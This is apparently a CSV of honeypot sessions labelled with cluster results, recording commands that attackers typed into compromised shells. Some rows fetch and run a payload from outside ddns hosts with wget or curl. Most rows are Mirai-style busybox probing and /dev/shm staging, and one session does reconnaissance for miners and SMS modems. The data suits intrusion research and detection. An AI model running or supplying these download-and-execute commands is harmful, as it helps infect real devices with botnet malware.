session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
5cdead6ae593,0,0,3.456379652023315,2,uname -a
5cdead6ae593,0,1,3.456379652023315,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget oakro.ddns.net/ssh || curl -o ssh oakro.ddns.net/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 1qaz@WSX
329191b151b8,2,2,10.134948492050173,13,enable
329191b151b8,2,3,10.134948492050173,13,system
329191b151b8,2,4,10.134948492050173,13,system
329191b151b8,2,5,10.134948492050173,13,shell
329191b151b8,2,6,10.134948492050173,13,shell
329191b151b8,2,7,10.134948492050173,13,sh
329191b151b8,2,8,10.134948492050173,13,cat /proc/mounts; /bin/busybox ZLMBN
329191b151b8,2,9,10.134948492050173,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZLMBN
329191b151b8,2,10,10.134948492050173,13,tftp; wget; /bin/busybox ZLMBN
329191b151b8,2,11,10.134948492050173,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
329191b151b8,2,12,10.134948492050173,13,while read i
329191b151b8,2,13,10.134948492050173,13,/bin/busybox ZLMBN
329191b151b8,2,14,10.134948492050173,13,rm .s; exit
d4769f89c00b,1,15,1.182728290557861,1,uname -s -v -n -r -m
d8223e6f5bc4,2,16,3.211135625839233,13,enable
d8223e6f5bc4,2,17,3.211135625839233,13,system
d8223e6f5bc4,2,18,3.211135625839233,13,system
d8223e6f5bc4,2,19,3.211135625839233,13,shell
d8223e6f5bc4,2,20,3.211135625839233,13,shell
d8223e6f5bc4,2,21,3.211135625839233,13,sh
d8223e6f5bc4,2,22,3.211135625839233,13,cat /proc/mounts; /bin/busybox ELJWS
d8223e6f5bc4,2,23,3.211135625839233,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ELJWS
d8223e6f5bc4,2,24,3.211135625839233,13,tftp; wget; /bin/busybox ELJWS
d8223e6f5bc4,2,25,3.211135625839233,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d8223e6f5bc4,2,26,3.211135625839233,13,while read i
d8223e6f5bc4,2,27,3.211135625839233,13,/bin/busybox ELJWS
d8223e6f5bc4,2,28,3.211135625839233,13,rm .s; exit
8d3019ae1a5a,2,29,0.813608407974243,13,enable
8d3019ae1a5a,2,30,0.813608407974243,13,system
8d3019ae1a5a,2,31,0.813608407974243,13,system
8d3019ae1a5a,2,32,0.813608407974243,13,shell
8d3019ae1a5a,2,33,0.813608407974243,13,shell
8d3019ae1a5a,2,34,0.813608407974243,13,sh
8d3019ae1a5a,2,35,0.813608407974243,13,cat /proc/mounts; /bin/busybox RJWCK
8d3019ae1a5a,2,36,0.813608407974243,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RJWCK
8d3019ae1a5a,2,37,0.813608407974243,13,tftp; wget; /bin/busybox RJWCK
8d3019ae1a5a,2,38,0.813608407974243,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
8d3019ae1a5a,2,39,0.813608407974243,13,while read i
8d3019ae1a5a,2,40,0.813608407974243,13,/bin/busybox RJWCK
8d3019ae1a5a,2,41,0.813608407974243,13,rm .s; exit
c67329299b6d,2,42,1.04880404472351,13,enable
c67329299b6d,2,43,1.04880404472351,13,system
c67329299b6d,2,44,1.04880404472351,13,system
c67329299b6d,2,45,1.04880404472351,13,shell
c67329299b6d,2,46,1.04880404472351,13,shell
c67329299b6d,2,47,1.04880404472351,13,sh
c67329299b6d,2,48,1.04880404472351,13,cat /proc/mounts; /bin/busybox UOXTH
c67329299b6d,2,49,1.04880404472351,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UOXTH
c67329299b6d,2,50,1.04880404472351,13,tftp; wget; /bin/busybox UOXTH
c67329299b6d,2,51,1.04880404472351,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
c67329299b6d,2,52,1.04880404472351,13,while read i
c67329299b6d,2,53,1.04880404472351,13,/bin/busybox UOXTH
c67329299b6d,2,54,1.04880404472351,13,rm .s; exit
abac76d64b7f,0,55,12.954164028167725,2,uname -a
abac76d64b7f,0,56,12.954164028167725,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hapto.ddns.net/ssh || curl -o ssh hapto.ddns.net/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane root
ee45c24367eb,1,57,117.75325894355774,9,/ip cloud print
ee45c24367eb,1,58,117.75325894355774,9,/ip cloud print
ee45c24367eb,1,59,117.75325894355774,9,ifconfig
ee45c24367eb,1,60,117.75325894355774,9,uname -a
ee45c24367eb,1,61,117.75325894355774,9,cat /proc/cpuinfo
ee45c24367eb,1,62,117.75325894355774,9,ps | grep '[Mm]iner'
ee45c24367eb,1,63,117.75325894355774,9,ps -ef | grep '[Mm]iner'
ee45c24367eb,1,64,117.75325894355774,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
ee45c24367eb,1,65,117.75325894355774,9,echo Hi | cat -n
a1fcd3e7e5f6,4,66,11.905640602111816,11,enable
a1fcd3e7e5f6,4,67,11.905640602111816,11,system
a1fcd3e7e5f6,4,68,11.905640602111816,11,system
a1fcd3e7e5f6,4,69,11.905640602111816,11,shell
a1fcd3e7e5f6,4,70,11.905640602111816,11,shell
a1fcd3e7e5f6,4,71,11.905640602111816,11,sh
a1fcd3e7e5f6,4,72,11.905640602111816,11,/bin/busybox SATORI
a1fcd3e7e5f6,4,73,11.905640602111816,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
a1fcd3e7e5f6,4,74,11.905640602111816,11,cat /bin/busybox
a1fcd3e7e5f6,4,75,11.905640602111816,11,while read i
a1fcd3e7e5f6,4,76,11.905640602111816,11,dd if=/bin/busybox bs=22 count=1
d51e460c7b30,2,77,4.036076784133911,13,enable
d51e460c7b30,2,78,4.036076784133911,13,system
d51e460c7b30,2,79,4.036076784133911,13,system
d51e460c7b30,2,80,4.036076784133911,13,shell
d51e460c7b30,2,81,4.036076784133911,13,shell
d51e460c7b30,2,82,4.036076784133911,13,sh
d51e460c7b30,2,83,4.036076784133911,13,cat /proc/mounts; /bin/busybox UNEIU
d51e460c7b30,2,84,4.036076784133911,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UNEIU
d51e460c7b30,2,85,4.036076784133911,13,tftp; wget; /bin/busybox UNEIU
d51e460c7b30,2,86,4.036076784133911,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d51e460c7b30,2,87,4.036076784133911,13,while read i
d51e460c7b30,2,88,4.036076784133911,13,/bin/busybox UNEIU
d51e460c7b30,2,89,4.036076784133911,13,rm .s; exit
78567d68a8f3,2,90,5.159321069717407,13,enable
78567d68a8f3,2,91,5.159321069717407,13,system
78567d68a8f3,2,92,5.159321069717407,13,system
78567d68a8f3,2,93,5.159321069717407,13,shell
78567d68a8f3,2,94,5.159321069717407,13,shell
78567d68a8f3,2,95,5.159321069717407,13,sh
78567d68a8f3,2,96,5.159321069717407,13,cat /proc/mounts; /bin/busybox XROPL
78567d68a8f3,2,97,5.159321069717407,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XROPL
78567d68a8f3,2,98,5.159321069717407,13,tftp; wget; /bin/busybox XROPL
78567d68a8f3,2,99,5.159321069717407,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
78567d68a8f3,2,100,5.159321069717407,13,while read i
78567d68a8f3,2,101,5.159321069717407,13,/bin/busybox XROPL
78567d68a8f3,2,102,5.159321069717407,13,rm .s; exit
a1708c7efde1,1,103,5.594111204147339,1,nproc; uname -a
a30230328068,2,104,2.943906784057617,13,enable
a30230328068,2,105,2.943906784057617,13,system
a30230328068,2,106,2.943906784057617,13,system
a30230328068,2,107,2.943906784057617,13,shell
a30230328068,2,108,2.943906784057617,13,shell
a30230328068,2,109,2.943906784057617,13,sh
a30230328068,2,110,2.943906784057617,13,cat /proc/mounts; /bin/busybox DYQVX
a30230328068,2,111,2.943906784057617,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DYQVX
a30230328068,2,112,2.943906784057617,13,tftp; wget; /bin/busybox DYQVX
a30230328068,2,113,2.943906784057617,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a30230328068,2,114,2.943906784057617,13,while read i
a30230328068,2,115,2.943906784057617,13,/bin/busybox DYQVX
a30230328068,2,116,2.943906784057617,13,rm .s; exit
e77109ef96fd,2,117,2.777678489685058,13,enable
e77109ef96fd,2,118,2.777678489685058,13,system
e77109ef96fd,2,119,2.777678489685058,13,system
e77109ef96fd,2,120,2.777678489685058,13,shell
e77109ef96fd,2,121,2.777678489685058,13,shell
e77109ef96fd,2,122,2.777678489685058,13,sh
e77109ef96fd,2,123,2.777678489685058,13,cat /proc/mounts; /bin/busybox KIHZA
e77109ef96fd,2,124,2.777678489685058,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KIHZA
e77109ef96fd,2,125,2.777678489685058,13,tftp; wget; /bin/busybox KIHZA
e77109ef96fd,2,126,2.777678489685058,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e77109ef96fd,2,127,2.777678489685058,13,while read i
